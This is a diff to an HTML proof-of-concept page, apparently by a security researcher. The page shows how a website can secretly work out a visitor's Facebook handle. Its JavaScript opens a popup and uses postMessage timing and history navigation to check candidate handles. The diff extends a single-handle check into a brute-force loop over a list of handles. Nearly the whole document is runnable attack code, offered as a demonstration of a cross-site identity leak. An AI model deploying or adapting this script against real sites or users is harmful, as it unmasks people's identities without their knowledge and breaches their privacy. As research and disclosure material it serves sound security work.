@@ -1,35 +1,56 @@
 <html><body>
-This is only PoC. Type smth like oijfowijefohwqe and your real handle on Facebook e.g. http://facebook.com/<b>egor.homakov</b> and see how detector works. It's pretty slow (<b>20 seconds</b> to be sure) history object is changed as soon as full page has been loaded. <br>
+This is only PoC. Type smth like oijfowijefohwqe and your real handle on Facebook e.g. http://facebook.com/<b>egor.homakov</b> and see how detector works. It's pretty slow (<b>6 seconds</b> to be sure) history object is changed as soon as full page has been loaded. <br>
 <br>
 In production exploit I could invent something for fast brute and history.forward(), but PoC is interesting on itself. And, yeah, you don't need to allow Popups in Chrome - because Popup in Chrome get opened in fact and nicely work in background. <b>Just wait...</b>
 <br>
-<br>
-P.S. Make sure to <b>reload</b> the page after each try. I didn't debug it, PoC is very simple. <b>tested only in chrome</b> if you don't use chrome it is your personal problem.
 <script>
 window.onmessage=function(e){
   if(await){
-    clearTimeout(fail);
-    x.close();
-    alert("Yes, you are "+handle);
+    clearTimeout(exact);
+    alert("No, you're not "+handle);
+    x.history.go(1);
+    setTimeout(try_next,timeout)
   }else{
     await = true;
   }
 }
-handle = prompt('Lets check if you are...(e.g. egor.homakov):')
+https = confirm('Do you have "https" in your profile URL? Cancel = NO, OK = YES')
+timeout = parseInt(prompt('Timeout for your network? For example 5000 - 5 seconds'));
+
+if(https){
+  base='https://www.facebook.com'
+}else{
+  base='http://www.facebook.com'
+}
 
 await = false;
+exact = false;
+handles = prompt('Type a list of handles, space separated(sdjo 234234 adsf egor.homakov ewrewqe)').split(' ')
+
+get_handle = function(){
+  return handles.shift()
+}
+
+try_next = function(){
+  // here we can just brute force ..
+  if(handles.length==0) return false
+  handle = get_handle()
+
+  next=base+'/'+handle+'#'
+  console.log('Navigate to ',next)
+  x.location=(next)
+
+  setTimeout(function(){
+    exact = setTimeout(function(){
+      alert('Yes you are '+handle)
+    }, 300);
+    x.history.back()
+  },100)
+}
 //opener.postMessage("","*")
 x=window.open('data:text/html,<script>opener.postMessage("","*")<'+'/script>'); 
 setTimeout(function(){
-  x.location=('http://www.facebook.com/profile.php#')
-  setTimeout(function(){
-    x.location=('http://www.facebook.com/'+handle+'#')
-    setTimeout(function(){
-      fail = setTimeout(function(){
-        alert('No, its not you. Reload the page and try again')
-      }, 500);
-      x.history.back()
-    },10000)
-  },10000)
-},200)
+  x.location=(base+'/profile.php')
+  setTimeout(try_next,timeout)
+},100)
 </script></body></html>
